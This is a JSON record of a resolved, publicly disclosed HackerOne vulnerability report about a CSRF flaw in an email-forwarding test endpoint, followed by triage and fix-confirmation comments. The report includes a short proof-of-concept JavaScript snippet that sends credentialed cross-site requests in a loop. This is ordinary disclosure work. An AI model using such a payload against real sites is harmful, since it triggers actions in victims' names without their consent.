{"id":1131473,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTMxNDcz","url":"https://hackerone.com/reports/1131473","title":"CSRF allows to test email forwarding","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2021-03-20T19:46:49.708Z","submitted_at":"2021-03-23T08:10:37.413Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"muon4","url":"/muon4","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-05-13T05:22:36.482Z","bug_reporter_agreed_on_going_public_at":"2021-05-13T05:22:36.356Z","team_member_agreed_on_going_public_at":"2021-05-12T21:02:24.999Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nIt is possible to send email forwarding emails in the name of victim. The main problem is that you don't verify the `X-CSRF-Token` in the endpoint `/security_email_forwarding/test_forwarding.json?id=$id`. \n \n\n## Steps To Reproduce:\n\n- Login as an program user who has access to the `Email Forwarding`\n- Navigate to the `https://hackerone.com/hackerone_h1p_bbp3/security_email_forwarding` and add new  email here (use e.g. wearehackerone.com address)\n- This will most likely fail. Atleast in our tests this used to happen\n- Make the following HTML file:\n\n```\n\u003cscript\u003e\nfor (i = 300; i \u003c 350; i++){\nvar url = \"https://hackerone.com/$program-id/security_email_forwarding/test_forwarding.json?id=\"+i;\nvar CSRF = new XMLHttpRequest();\nCSRF.open(\"GET\", url, true);\nCSRF.withCredentials = 'true';\nCSRF.send();\n}\n\u003c/script\u003e\n```\n\nNote: set your forwarding id to be in this loop `for (i = 300; i \u003c 350; i++){` (the purpose of this for loop is just to show that an attacker could verify all these emails). Also, set your program name to as a value of `$program-id`.\n\n- Open this email to the new tab of the current browser \n- The email forwarding test messages will be sent\n\n## Recommendation:\n\nVerify that `X-CSRF-Token` which is already part of original HTTP request.\n\n## References:\n\n`https://owasp.org/www-community/attacks/csrf`\n\n## Impact\n\nCSRF allow to send email forward test messages","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-06-11T21:02:25.776Z","allow_singular_disclosure_after":-10513464.895161796,"singular_disclosure_allowed":true,"vote_count":15,"voters":["tk0","ali","ayoub0x1","akashhamal0x01","donthackme123","itta611","omerfi","khloelynn","thmgroot","meispi","and 5 more..."],"severity":{"rating":"low","score":3.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":70334,"asset_type":"URL","asset_identifier":"hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":11064887,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2021-03-20T19:46:49.873Z","updated_at":"2021-03-20T19:46:49.873Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11064888,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2021-03-20T19:46:49.936Z","updated_at":"2021-03-20T19:46:49.936Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11098158,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2021-03-23T21:40:45.455Z","updated_at":"2021-03-23T21:40:45.455Z","actor":{"username":"eduardo_h1","cleared":false,"url":"/eduardo_h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11653865,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @muon4, \n\nThanks for this report and sorry that it took so long for us to get back to you. I validated the issue and it seems we're indeed not correctly validating CSRF tokens on this endpoint, we'll get this fixed. However, the impact of this issue is that the attacker can send validation emails to a user that's currently setting up email forwarding, a pretty confusing UX but doesn't directly lead to a high-impact security issue.\n\nThanks again for the report!","automated_response":false,"created_at":"2021-05-07T08:05:17.935Z","updated_at":"2021-05-07T08:05:17.935Z","actor":{"username":"wvdv","cleared":false,"url":"/wvdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11693382,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've released a fix for this, can you perform a retest? Thanks!","automated_response":false,"created_at":"2021-05-11T04:08:39.526Z","updated_at":"2021-05-11T04:08:39.526Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11714996,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bencode \n\nYou've changed the GET request -\u003e POST request and now the CSRF token is indeed validated! So looks like the fix is working.\n\nCheers!","automated_response":false,"created_at":"2021-05-12T12:37:44.549Z","updated_at":"2021-05-12T12:37:44.549Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11725783,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for confirming @muon4!","automated_response":false,"created_at":"2021-05-12T21:01:48.739Z","updated_at":"2021-05-12T21:01:48.739Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"muon4","url":"/muon4"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11725785,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"This report was a pentest finding and therefore no bounty was awarded.","automated_response":false,"created_at":"2021-05-12T21:02:25.045Z","updated_at":"2021-05-12T21:02:25.045Z","first_to_agree":true,"actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11729154,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-05-13T05:22:36.408Z","updated_at":"2021-05-13T05:22:36.408Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11729155,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-05-13T05:22:36.546Z","updated_at":"2021-05-13T05:22:36.546Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}